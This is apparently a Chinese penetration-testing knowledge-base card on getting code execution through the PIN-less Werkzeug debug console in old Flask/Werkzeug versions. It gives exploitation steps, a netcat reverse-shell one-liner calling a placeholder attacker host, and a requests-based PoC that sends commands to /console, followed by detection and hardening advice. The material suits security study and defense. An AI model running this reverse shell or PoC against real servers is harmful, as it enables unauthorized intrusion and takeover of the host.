---
id: web-python-framework-werkzeug-legacy-console-no-pin-rce
title: 旧版 Werkzeug 调试控制台 /console 无 PIN 保护：直接执行 Python 表达式 RCE
type: scenario
domain: web
path: web/python/framework
technique: werkzeug-legacy-console-no-pin-rce
tags:
- werkzeug
- flask
- debug
- console
- rce
- python
- interactive-console
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V413
  verified_at: '2026-11-09T15:06:44+08:00'
  notes: 已对照原文与图片核对：nikto 指纹 Werkzeug/0.10.5-dev Python/2.7.12+、dirb 命中 /console CODE:200、页面 [console ready] 无 PIN 输入即可执行 os.listdir 并列出 /home/alekos，与原文一致；0.10.x 早于 0.11 引入 PIN 保护的历史事实成立，--force 与两张 PIN 泄露/PIN 伪造卡的区分理由成立。未验证点：卡片中的 requests 自动化 PoC 为按调试器协议补写的重构脚本（原文仅页面交互），未在高版本/本机复跑；受影响版本界限原文未给出，affected_versions 已 --clear。
url: /docs/web/python/framework/web-python-framework-werkzeug-legacy-console-no-pin-rce/
draft: false
kb_aliases:
- Werkzeug /console RCE
- Werkzeug 0.10.5 调试控制台
- Flask Interactive Console
- 无 PIN 调试控制台
- werkzeug debugger console
---

## 一句话结论

Flask 应用以 debug 模式运行且使用旧版 Werkzeug 时，调试器会在 `/console` 暴露一个无需 PIN 的 Interactive Console：访问该页面就能在应用进程上下文里执行任意 Python 表达式（如 `import os; os.listdir('.')`），直接获得与 Web 进程同权限的代码执行。

## 原理

- **Werkzeug 调试器**：Flask 的 `debug=True` 会启用 Werkzeug 的调试中间件，异常时返回带 traceback 的调试页，并在 `/console` 提供交互式 Python 控制台，页面说明“可以执行 Python 表达式”（Interactive Console）。
- **为什么这里不用 PIN**：Werkzeug 的调试控制台在早期版本没有认证，任何能访问 `/console` 的人都能直接执行代码；后续版本才加入 PIN 保护（PIN 由环境 bits 派生或由 `WERKZEUG_DEBUG_PIN` 指定）。原文靶机的指纹为 `Werkzeug/0.10.5-dev`（nikto 识别到的 Server banner），属于旧版，因此 `/console` 打开即是 `[console ready] >>>`，无需任何口令。
- **执行上下文**：控制台代码运行在 Flask 应用进程内，继承该进程的用户、环境变量、已加载模块与文件系统权限；因此可以直接列目录、读配置、导入 `os`/`subprocess`、反弹 shell，或修改应用内存中的对象。
- **为什么要先找到它**：`/console` 是调试器固定路径，`dirb`/`feroxbuster` 等目录爆破会命中；nikto 也会把 `/console` 标为 interesting。若应用只监听 `127.0.0.1`，还需先通过代理/隧道进入其访问范围。

## 触发条件

- Flask/Werkzeug 应用开启了调试模式（`debug=True` 或 `FLASK_DEBUG=1`），且调试器未被禁用。
- Werkzeug 为未引入 PIN 保护的旧版本（原文为 0.10.5-dev）；或显式配置成无需 PIN/使用固定空 PIN，使 `/console` 直接可用。
- 攻击者能访问 `/console`（公网、内网，或经 Squid/SSH 等跳板到达回环）。
- 应用进程对目标文件/命令有执行权限（通常即 Web 用户权限）。

## 利用步骤

1. 指纹识别：nikto 或响应头/报错页确认 Werkzeug 版本与调试模式，例如 banner 显示 `Werkzeug/0.10.5-dev Python/2.7.12+`，且 500 错误页带 traceback。
2. 目录爆破发现 `/console`（常见返回 200 且页面标题为 Interactive Console）。
3. 访问 `http://<host>/console`（若只监听回环则经代理/隧道），确认页面出现 `[console ready]` 且无 PIN 输入框。
4. 在控制台执行侦察命令：
   ```python
   import os
   os.listdir('.')
   os.listdir('/home')
   ```
5. 反弹 shell 或执行命令（出站受限时改用对应可用协议，例如仅 UDP 放行时用 UDP 反连）：
   ```python
   import os
   os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u <attacker> 443 >/tmp/f &').read()
   ```
6. 在攻击机对应监听端接收 shell，继续收集配置与凭据。

## PoC

浏览器方式（原文）：

```text
访问 http://127.0.0.1/console
>>> import os
>>> os.listdir('.')
['manage-shorty.py', 'testing', 'shorty']
>>> os.listdir('/home')
['alekos']
```

自动化方式（按调试器控制台协议构造，字段名以目标版本页面为准）：

```python
import re, requests

BASE = "http://127.0.0.1"          # 若经代理，设置 proxies={"http": "http://user:pass@proxy:3128"}
r = requests.get(BASE + "/console")
secret = re.search(r'var SECRET\s*=\s*"([^"]+)"', r.text).group(1)
r = requests.post(BASE + "/console", data={
    "__debugger__": "yes",
    "cmd": "__import__('os').system('id')",
    "frm": "0",
    "s": secret,
})
print(r.text)
```

说明：原文通过页面直接交互，未提供自动化脚本；上述脚本为按旧版调试器控制台字段还原的最小化写法，未在本机复跑。

## 变体与关联

- **现代 Werkzeug 的 PIN 路径**：新版控制台需要 PIN；可通过硬编码 PIN 泄露或 public/private bits 推导伪造，见 [[web-python-framework-flask-debug-pin-file-read-console-rce]] 与 [[web-python-framework-flask-werkzeug-debug-pin-forgery]]。
- **只暴露 traceback 页**：即使 `/console` 加 PIN，异常页仍可能泄露源码片段、路径、环境变量；可配合其他漏洞读取文件。
- **经代理访问回环**：应用只监听 `127.0.0.1` 时先用 Squid/SSH 隧道进入，见 [[pentest-lateral-movement-authenticated-squid-proxy-localhost-port-scan]]。
- **边界**：Werkzeug 新版本强制 PIN、`debug=False`、生产 WSGI 服务器未加载调试中间件、或 `/console` 被反向代理/WAF 拦截时，本链不成立。

## 检测与防御

- **配置**：生产环境绝不开启 `debug=True`；使用 gunicorn/uwsgi 等生产服务器；升级 Werkzeug 到带 PIN 保护的版本。
- **暴露面**：`/console`、`/__debugger__` 不应对外可达；反向代理层直接拒绝这些路径；调试端口只绑定回环并限制访问来源。
- **检测**：访问日志中出现 `/console`、`/__debugger__` 请求；Web 进程出现异常 Python 子进程（`sh -c`、`nc`、`python -c`）；应用进程发起非预期出站连接；500 错误页被大量请求探测。
- **响应**：发现控制台访问立即下线应用、轮换所有环境变量/密钥、排查是否已通过该通道执行命令与横向移动。
